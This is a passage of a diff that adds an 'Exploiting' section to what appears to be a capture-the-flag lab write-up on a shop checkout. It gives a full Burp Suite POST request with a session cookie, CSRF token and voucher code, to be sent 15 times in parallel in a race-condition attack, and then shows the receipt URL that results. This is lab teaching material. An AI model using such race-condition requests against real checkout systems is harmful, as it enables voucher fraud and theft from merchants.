@@ -38,3 +38,27 @@ Progress: 873100 / 873104 (100.00%)
 ```
 </code>
 
+**Exploiting**
+
+run in repeter in paralel run 15x 
+
+in Burpsuit
+POST /checkout HTTP/1.1
+Host: 10.67.128.59
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.67.128.59/checkout
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Origin: http://10.67.128.59
+Connection: keep-alive
+Cookie: session=eyJjc3JmX3Rva2VuIjoiMTc0ZjYyNDc3ZDJmNzVlMTJjMTIxZThlMmM2OTg1OTk3NzdiYzI3MyJ9.aVN05w.Ppwl7uwxT0EOcvv8PV0FiCJWEm0
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+csrf_token=IjE3NGY2MjQ3N2QyZjc1ZTEyYzEyMWU4ZTJjNjk4NTk5Nzc3YmMyNzMi.aVN03A.fycCrxgNSYPyzNXV2OvX-Pht7PE&name=&voucher_code=TRYHACK3M&submit=Checkout
+
+end get this
+http://10.67.128.59/receipt/82739098304716027352341076?name=
